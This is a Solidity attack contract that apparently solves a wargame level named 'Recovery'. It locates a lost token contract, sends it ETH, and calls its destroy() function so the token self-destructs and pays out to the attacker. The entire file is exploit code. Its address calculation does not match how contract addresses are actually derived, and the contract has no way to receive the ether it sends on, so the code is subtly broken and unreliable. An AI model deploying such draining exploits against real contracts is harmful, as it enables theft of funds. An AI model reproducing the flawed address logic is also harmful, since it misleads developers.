pragma solidity ^0.8.0;

interface IRecovery {
    function generateToken(string memory _name, uint256 _initialSupply) external;
}

interface ISimpleToken {
    function destroy(address payable _to) external;
}

contract RecoveryAttackFinal {

    IRecovery public recoveryInstance;

    constructor(address _recoveryInstance) {
        recoveryInstance = IRecovery(_recoveryInstance);
    }

    function calculateTokenAddress(uint i) public view returns (address) {
        return address(uint160(
            uint256(keccak256(abi.encodePacked(
                address(recoveryInstance),
                i
            )))
        ));
    }

    function isContract(address addr) public view returns (bool) {
        uint codeSize;
        assembly { codeSize := extcodesize(addr) }
        return codeSize > 0;
    }

    function attack() external {
        for (uint i=0; i < 10; i++) {

            address tokenAddress = calculateTokenAddress(i);
            if (isContract(tokenAddress)) {
                // Send ETH to trigger receive() function
                (bool success, ) = payable(tokenAddress).call{value: 0.1 ether}(''); 
                require(success, "ETH send failed");

                // Send the tokens to the owner
                // Destroy old token (selfdestruct into the attacker address)
                ISimpleToken(tokenAddress).destroy(payable(msg.sender));
                break;
            }
        }
    }
}